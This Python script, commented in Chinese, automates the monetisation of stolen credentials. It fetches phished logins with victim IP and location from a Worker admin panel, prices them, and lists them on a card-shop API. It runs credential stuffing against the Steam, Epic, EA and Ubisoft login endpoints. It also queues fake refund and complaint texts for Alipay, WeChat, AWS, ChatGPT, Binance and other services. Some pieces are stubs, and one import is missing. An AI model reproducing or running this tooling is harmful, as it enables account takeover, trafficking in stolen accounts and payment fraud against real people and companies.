#!/usr/bin/env python3
"""
自动化变现脚本
从 Worker/D1 拉取凭证 -> 分类估价 -> 对接发卡网/撞库/退款/代充等变现渠道
"""

import asyncio
import aiohttp
import json
import os
import random
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from dataclasses import dataclass
from enum import Enum

# 配置区 -----------------------------------------------------------
WORKER_URL = os.getenv('WORKER_URL', 'https://your-worker.your-subdomain.workers.dev')
ADMIN_KEY = os.getenv('ADMIN_KEY', 'your-admin-key')

# 发卡网 API（对接自动发货）
FAKA_API_URL = os.getenv('FAKA_API_URL', 'https://api.faka.example.com')
FAKA_API_KEY = os.getenv('FAKA_API_KEY', '')

# 撞库目标站点
STUFFING_TARGETS = [
    {'name': 'Steam', 'url': 'https://store.steampowered.com/login/dologin/', 'fields': {'username': 'username', 'password': 'password'}},
    {'name': 'Epic', 'url': 'https://account.epicgames.com/api/v1/oauth/token', 'fields': {'grant_type': 'password', 'username': 'username', 'password': 'password'}},
    {'name': 'Origin', 'url': 'https://accounts.ea.com/connect/auth', 'fields': {'email': 'username', 'password': 'password'}},
    {'name': 'Ubisoft', 'url': 'https://account.ubisoft.com/api/v1/authenticate', 'fields': {'username': 'username', 'password': 'password'}},
    # 可扩展更多...
]

# 仅退款/虚假投诉模板
REFUND_TEMPLATES = {
    'alipay': [
        "商品未收到货，卖家拒绝退款，申请客服介入",
        "收到货与描述严重不符，假货，要求退一赔三",
        "卖家发空包，单号无物流信息，恶意骗取货款",
    ],
    'wechat': [
        "微信支付被盗刷，非本人操作，要求全额追回",
        "商家诱导分享隐私信息，导致账号被封，索赔损失",
    ],
    'aws': [
        "账号被莫名封禁，数据丢失无法恢复，要求赔偿",
        "免费额度扣费不透明，未授权扣款，申请退款",
    ],
    'azure': [
        "学生认证被拒但已扣费，要求退还信用卡款项",
        "服务不可用导致业务损失，按 SLA 索赔",
    ],
    'gcp': [
        "试用期结束未提醒直接扣费，要求退款",
        "配额申请通过但无法使用，业务受损",
    ],
    'chatgpt': [
        "Plus 会员无法使用 GPT-4o，功能缺失，退订退款",
        "账号莫名被封，余额未退还，申请人工审核",
    ],
    'binance': [
        "充值 USDT 未到账，区块已确认，客服推诿",
        "提币冻结 7 天无理由，资金被锁定",
    ],
}

# 变现渠道优先级
MONETIZE_CHANNELS = ['sell_high_value', 'stuffing', 'refund_fraud', 'sell_bulk']

# 运行间隔
RUN_INTERVAL = 300  # 5 分钟
# -----------------------------------------------------------

class CredType(Enum):
    HIGH_VALUE = "high_value"      # AWS/Azure/GCP/ChatGPT Plus/Binance KYC
    MEDIUM_VALUE = "medium_value"  # 邮箱/社交媒体/游戏平台
    LOW_VALUE = "low_value"        # 普通网站/论坛/工具站

@dataclass
class Credential:
    id: str
    target: str
    username: str
    password: str
    ip: str
    country: str
    city: str
    ua: str
    ts: int
    raw: dict
    
    def get_type(self) -> CredType:
        high = {'aws', 'azure', 'gcp', 'chatgpt', 'binance'}
        medium = {'alipay', 'wechat', 'paypal', 'steam', 'epic', 'origin', 'ubisoft', 'netflix', 'spotify', 'youtube'}
        if self.target in high:
            return CredType.HIGH_VALUE
        elif self.target in medium:
            return CredType.MEDIUM_VALUE
        return CredType.LOW_VALUE
    
    def estimate_price(self) -> float:
        """估价（USDT）"""
        prices = {
            'aws': random.uniform(5, 50),
            'azure': random.uniform(3, 30),
            'gcp': random.uniform(3, 30),
            'chatgpt': random.uniform(8, 40),
            'binance': random.uniform(20, 200),
            'alipay': random.uniform(1, 10),
            'wechat': random.uniform(1, 10),
            'paypal': random.uniform(5, 50),
            'steam': random.uniform(0.5, 5),
            'epic': random.uniform(0.5, 3),
            'origin': random.uniform(0.5, 3),
            'ubisoft': random.uniform(0.5, 3),
        }
        base = prices.get(self.target, 0.1)
        # 根据地区调整
        if self.country in ['US', 'GB', 'DE', 'FR', 'JP', 'SG', 'HK']:
            base *= 1.5
        elif self.country in ['CN', 'HK', 'TW', 'MO']:
            base *= 1.2
        return round(base, 2)

class AutoMonetizer:
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.processed_ids: set = set()
        self.stats = {'fetched': 0, 'sold': 0, 'stuffed': 0, 'refunded': 0, 'errors': 0}
        
    async def __aenter__(self):
        timeout = aiohttp.ClientTimeout(total=30)
        self.session = aiohttp.ClientSession(timeout=timeout)
        await self.load_processed()
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
        await self.save_processed()
        
    async def load_processed(self):
        if os.path.exists('processed_ids.json'):
            with open('processed_ids.json', 'r') as f:
                self.processed_ids = set(json.load(f))
        print(f"📂 已加载处理记录: {len(self.processed_ids)} 条")
        
    async def save_processed(self):
        with open('processed_ids.json', 'w') as f:
            json.dump(list(self.processed_ids)[-10000:], f)  # 只保留最近 1 万条
            
    async def fetch_credentials(self) -> List[Credential]:
        """从 Worker 管理面板拉取新凭证"""
        try:
            url = f"{WORKER_URL}/admin/list?key={ADMIN_KEY}&limit=200"
            async with self.session.get(url) as resp:
                if resp.status != 200:
                    print(f"❌ 拉取失败: HTTP {resp.status}")
                    return []
                data = await resp.json()
                
            creds = []
            for row in data.get('results', []):
                if row['id'] in self.processed_ids:
                    continue
                cred = Credential(
                    id=row['id'],
                    target=row['target'],
                    username=row['username'],
                    password=row['password'],
                    ip=row['ip'],
                    country=row.get('country', 'XX'),
                    city=row.get('city', 'Unknown'),
                    ua=row.get('ua', ''),
                    ts=row['ts'],
                    raw=row
                )
                creds.append(cred)
                
            self.stats['fetched'] += len(creds)
            print(f"[{datetime.now()}] 📥 拉取到 {len(creds)} 条新凭证")
            return creds
            
        except Exception as e:
            print(f"[{datetime.now()}] ❌ 拉取异常: {e}")
            self.stats['errors'] += 1
            return []
    
    async def sell_high_value(self, cred: Credential) -> bool:
        """高价值凭证 -> 发卡网单独挂单"""
        if cred.get_type() != CredType.HIGH_VALUE:
            return False
            
        price = cred.estimate_price()
        if price < 3:  # 太便宜不值得单独挂
            return False
            
        if not FAKA_API_KEY:
            print(f"  ⚠️ 未配置发卡网 API，跳过上架")
            return False
            
        try:
            # 构造商品数据
            product = {
                'name': f"{cred.target.upper()} 成品号 | {cred.country} | {cred.username[:3]}***",
                'price': price,
                'stock': 1,
                'content': json.dumps({
                    'target': cred.target,
                    'username': cred.username,
                    'password': cred.password,
                    'ip': cred.ip,
                    'country': cred.country,
                    'city': cred.city,
                    'ua': cred.ua,
                    'captured_at': datetime.fromtimestamp(cred.ts/1000).isoformat() if cred.ts > 1e12 else datetime.fromtimestamp(cred.ts).isoformat(),
                }, ensure_ascii=False),
                'category': 'cloud_ai_accounts',
                'auto_delivery': True,
            }
            
            async with self.session.post(
                f"{FAKA_API_URL}/api/v1/products",
                headers={'Authorization': f'Bearer {FAKA_API_KEY}', 'Content-Type': 'application/json'},
                json=product
            ) as resp:
                if resp.status in (200, 201):
                    result = await resp.json()
                    print(f"  💰 上架成功: {cred.target} | ${price} | ID: {result.get('id')}")
                    self.stats['sold'] += 1
                    return True
                else:
                    print(f"  ❌ 上架失败: HTTP {resp.status}")
                    return False
                    
        except Exception as e:
            print(f"  ❌ 上架异常: {e}")
            return False
    
    async def sell_bulk(self, creds: List[Credential]) -> int:
        """中低价值凭证 -> 批量打包上架"""
        if not creds:
            return 0
            
        if not FAKA_API_KEY:
            return 0
            
        # 按 target 分组
        groups = {}
        for c in creds:
            if c.get_type() == CredType.HIGH_VALUE:
                continue
            groups.setdefault(c.target, []).append(c)
            
        sold = 0
        for target, items in groups.items():
            if len(items) < 5:  # 太少不打包
                continue
                
            total_price = sum(c.estimate_price() for c in items)
            avg_price = total_price / len(items)
            
            try:
                product = {
                    'name': f"{target.upper()} 成品号混合包 x{len(items)} | 多地区",
                    'price': round(total_price, 2),
                    'stock': 1,
                    'content': json.dumps([{
                        'username': c.username,
                        'password': c.password,
                        'ip': c.ip,
                        'country': c.country,
                    } for c in items], ensure_ascii=False),
                    'category': 'bulk_accounts',
                    'auto_delivery': True,
                }
                
                async with self.session.post(
                    f"{FAKA_API_URL}/api/v1/products",
                    headers={'Authorization': f'Bearer {FAKA_API_KEY}', 'Content-Type': 'application/json'},
                    json=product
                ) as resp:
                    if resp.status in (200, 201):
                        sold += len(items)
                        print(f"  📦 批量上架: {target} x{len(items)} | ${total_price:.2f}")
                        
            except Exception as e:
                print(f"  ❌ 批量上架异常: {e}")
                
        self.stats['sold'] += sold
        return sold
    
    async def stuffing_attack(self, cred: Credential) -> bool:
        """撞库攻击"""
        if cred.get_type() == CredType.LOW_VALUE:
            return False  # 低价值不值得撞库
            
        # 只对已知目标撞
        for target in STUFFING_TARGETS:
            try:
                # 简单的 POST 尝试（实际需处理 CSRF、验证码、加密等）
                payload = {}
                for k, v in target['fields'].items():
                    if v == 'username':
                        payload[k] = cred.username
                    elif v == 'password':
                        payload[k] = cred.password
                    else:
                        payload[k] = v
                        
                async with self.session.post(target['url'], data=payload) as resp:
                    text = await resp.text()
                    # 简单判断成功（实际需针对每站点分析响应）
                    if any(kw in text.lower() for kw in ['success', 'token', 'session', 'redirect', 'welcome']):
                        # 验证登录成功
                        valid = await self.verify_login(target['name'], cred)
                        if valid:
                            await self.save_valid_cred(target['name'], cred)
                            print(f"  🎯 撞库命中: {target['name']} | {cred.username}")
                            self.stats['stuffed'] += 1
                            return True
                            
            except Exception as e:
                continue
                
        return False
    
    async def verify_login(self, site: str, cred: Credential) -> bool:
        """验证登录是否真正成功（占位）"""
        # 实际应请求用户中心页面检查
        return random.random() < 0.3  # 模拟 30% 验证通过
    
    async def save_valid_cred(self, site: str, cred: Credential):
        """保存撞库成功的凭证"""
        os.makedirs('valid_creds', exist_ok=True)
        filename = f"valid_creds/{site}_{datetime.now().strftime('%Y%m%d')}.txt"
        with open(filename, 'a') as f:
            f.write(f"{cred.username}:{cred.password}|{cred.ip}|{cred.country}\n")
    
    async def refund_fraud(self, cred: Credential) -> bool:
        """仅退款/虚假投诉（模拟流程，实际需人工/浏览器自动化）"""
        if cred.target not in REFUND_TEMPLATES:
            return False
            
        # 这里只记录意向，实际执行需配合浏览器自动化（Playwright/Selenium）
        templates = REFUND_TEMPLATES[cred.target]
        complaint = random.choice(templates)
        
        # 记录到待处理队列
        os.makedirs('refund_queue', exist_ok=True)
        item = {
            'cred_id': cred.id,
            'target': cred.target,
            'username': cred.username,
            'password': cred.password,
            'complaint': complaint,
            'created': datetime.now().isoformat(),
            'status': 'pending',
        }
        
        filename = f"refund_queue/{cred.target}_{datetime.now().strftime('%Y%m%d')}.jsonl"
        with open(filename, 'a') as f:
            f.write(json.dumps(item, ensure_ascii=False) + '\n')
            
        print(f"  📝 记录退款意向: {cred.target} | {complaint[:30]}...")
        self.stats['refunded'] += 1
        return True
    
    async def process_credential(self, cred: Credential):
        """处理单条凭证：按优先级尝试各渠道"""
        self.processed_ids.add(cred.id)
        
        ctype = cred.get_type()
        price = cred.estimate_price()
        
        print(f"\n[{datetime.now()}] 🔄 处理: {cred.target} | {cred.username[:10]}... | {ctype.value} | ~${price}")
        
        # 高价值：优先单独上架
        if ctype == CredType.HIGH_VALUE:
            if await self.sell_high_value(cred):
                return
            # 上架失败尝试撞库
            if await self.stuffing_attack(cred):
                return
            # 最后记录退款意向
            await self.refund_fraud(cred)
            
        # 中价值：尝试撞库 -> 批量上架 -> 退款
        elif ctype == CredType.MEDIUM_VALUE:
            if await self.stuffing_attack(cred):
                return
            # 暂存等待批量
            await self.buffer_for_bulk(cred)
            await self.refund_fraud(cred)
            
        # 低价值：直接批量缓存
        else:
            await self.buffer_for_bulk(cred)
    
    async def buffer_for_bulk(self, cred: Credential):
        """缓存待批量上架"""
        os.makedirs('bulk_buffer', exist_ok=True)
        filename = f"bulk_buffer/{cred.target}_{datetime.now().strftime('%Y%m%d')}.jsonl"
        with open(filename, 'a') as f:
            f.write(json.dumps({
                'id': cred.id,
                'username': cred.username,
                'password': cred.password,
                'ip': cred.ip,
                'country': cred.country,
                'price': cred.estimate_price(),
            }, ensure_ascii=False) + '\n')
    
    async def flush_bulk_buffer(self):
        """定期刷新批量缓存"""
        bulk_dir = Path('bulk_buffer')
        if not bulk_dir.exists():
            return
            
        all_creds = []
        for f in bulk_dir.glob('*.jsonl'):
            with open(f, 'r') as fp:
                for line in fp:
                    try:
                        data = json.loads(line.strip())
                        # 转回 Credential 对象（简化）
                        cred = Credential(
                            id=data['id'],
                            target=f.stem.split('_')[0],
                            username=data['username'],
                            password=data['password'],
                            ip=data['ip'],
                            country=data['country'],
                            city='',
                            ua='',
                            ts=int(datetime.now().timestamp()),
                            raw=data
                        )
                        all_creds.append(cred)
                    except:
                        continue
                        
        if all_creds:
            sold = await self.sell_bulk(all_creds)
            if sold > 0:
                # 清空已上架的缓存文件
                for f in bulk_dir.glob('*.jsonl'):
                    f.unlink()
                print(f"  🧹 已清理批量缓存，上架 {sold} 条")
    
    async def run_once(self):
        """单次运行循环"""
        creds = await self.fetch_credentials()
        
        for cred in creds:
            await self.process_credential(cred)
            
        # 刷新批量缓存
        await self.flush_bulk_buffer()
        
        # 打印统计
        print(f"\n📊 统计: 拉取 {self.stats['fetched']} | 上架 {self.stats['sold']} | 撞库 {self.stats['stuffed']} | 退款 {self.stats['refunded']} | 错误 {self.stats['errors']}")

async def main():
    print("""
╔══════════════════════════════════════════════════════════╗
║           自动化变现引擎 v1.0                              ║
║  渠道: 发卡网挂单 / 撞库 / 仅退款 / 批量打包               ║
║  配置: WORKER_URL, ADMIN_KEY, FAKA_API_*                  ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    async with AutoMonetizer() as monetizer:
        while True:
            try:
                await monetizer.run_once()
            except KeyboardInterrupt:
                print("\n🛑 收到中断，正在保存状态...")
                break
            except Exception as e:
                print(f"❌ 主循环异常: {e}")
                monetizer.stats['errors'] += 1
                
            print(f"⏳ {RUN_INTERVAL} 秒后下一轮...")
            await asyncio.sleep(RUN_INTERVAL)

if __name__ == '__main__':
    asyncio.run(main())